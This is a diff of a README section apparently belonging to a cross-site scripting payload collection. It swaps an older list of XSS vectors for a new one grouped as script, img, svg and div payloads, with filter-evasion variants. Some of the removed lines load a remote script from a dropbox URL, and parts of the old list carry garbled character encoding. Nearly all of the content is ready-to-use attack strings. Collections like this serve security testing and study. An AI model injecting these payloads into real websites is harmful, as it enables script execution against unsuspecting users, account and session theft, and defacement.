@@ -24,63 +24,39 @@ An attacker can use XSS to send a malicious script to an unsuspecting user. The 
 ## The payloads
 
 ```
-<script>alert(123);</script>
-<ScRipT>alert("XSS");</ScRipT>
-<script>alert(123)</script>
-<script>alert("hellox worldss");</script>
-<script>alert(�XSS�)</script> 
-<script>alert(�XSS�);</script>
-<script>alert(�XSS�)</script>
-�><script>alert(�XSS�)</script>
-<script>alert(/XSS�)</script>
-<script>alert(/XSS/)</script>
-</script><script>alert(1)</script>
-�; alert(1);
-�)alert(1);//
-<ScRiPt>alert(1)</sCriPt>
-<IMG SRC=jAVasCrIPt:alert(�XSS�)>
-<IMG SRC=�javascript:alert(�XSS�);�>
-<IMG SRC=javascript:alert(&quot;XSS&quot;)>
-<IMG SRC=javascript:alert(�XSS�)>      
-<img src=xss onerror=alert(1)>
+// Basic payload
+<script>alert('XSS')</script>
+<scr<script>ipt>alert('XSS')</scr<script>ipt>
+"><script>alert('XSS')</script>
+"><script>alert(String.fromCharCode(88,83,83))</script>
 
+// Img payload
+<img src=x onerror=alert('XSS');>
+<img src=x onerror=alert('XSS')//
+<img src=x onerror=alert(String.fromCharCode(88,83,83));>
+<img src=x oneonerrorrror=alert(String.fromCharCode(88,83,83));>
+<img src=x:alert(alt) onerror=eval(src) alt=xss>
+"><img src=x onerror=alert('XSS');>
+"><img src=x onerror=alert(String.fromCharCode(88,83,83));>
 
-<iframe %00 src="&Tab;javascript:prompt(1)&Tab;"%00>
+// Svg payload
+<svgonload=alert(1)>
+<svg/onload=alert('XSS')>
+<svg onload=alert(1)//
+<svg/onload=alert(String.fromCharCode(88,83,83))>
+<svg id=alert(1) onload=eval(id)>
+"><svg/onload=alert(String.fromCharCode(88,83,83))>
+"><svg/onload=alert(/XSS/)
+<svg><script href=data:,alert(1) />(`Firefox` is the only browser which allows self closing script)
 
-<svg><style>{font-family&colon;'<iframe/onload=confirm(1)>'
-
-<input/onmouseover="javaSCRIPT&colon;confirm&lpar;1&rpar;"
-
-<sVg><scRipt %00>alert&lpar;1&rpar; {Opera}
-
-<img/src=`%00` onerror=this.onerror=confirm(1)
-
-<form><isindex formaction="javascript&colon;confirm(1)"
-
-<img src=`%00`&NewLine; onerror=alert(1)&NewLine;
-
-<script/&Tab; src='https://dl.dropbox.com/u/13018058/js.js' /&Tab;></script>
-
-<ScRipT 5-0*3+9/3=>prompt(1)</ScRipT giveanswerhere=?
-
-<iframe/src="data:text/html;&Tab;base64&Tab;,PGJvZHkgb25sb2FkPWFsZXJ0KDEpPg==">
-
-<script /*%00*/>/*%00*/alert(1)/*%00*/</script /*%00*/
-
-&#34;&#62;<h1/onmouseover='\u0061lert(1)'>%00
-
-<iframe/src="data:text/html,<svg &#111;&#110;load=alert(1)>">
-
-<meta content="&NewLine; 1 &NewLine;; JAVASCRIPT&colon; alert(1)" http-equiv="refresh"/>
-
-<svg><script xlink:href=data&colon;,window.open('https://www.google.com/')></script
-
-<svg><script x:href='https://dl.dropbox.com/u/13018058/js.js' {Opera}
-
-<meta http-equiv="refresh" content="0;url=javascript:confirm(1)">
-<iframe src=javascript&colon;alert&lpar;document&period;location&rpar;>
-
-```
+// Div payload
+<div onpointerover="alert(45)">MOVE HERE</div>
+<div onpointerdown="alert(45)">MOVE HERE</div>
+<div onpointerenter="alert(45)">MOVE HERE</div>
+<div onpointerleave="alert(45)">MOVE HERE</div>
+<div onpointermove="alert(45)">MOVE HERE</div>
+<div onpointerout="alert(45)">MOVE HERE</div>
+<div onpointerup="alert(45)">MOVE HERE</div>```
 
 ## Author
 
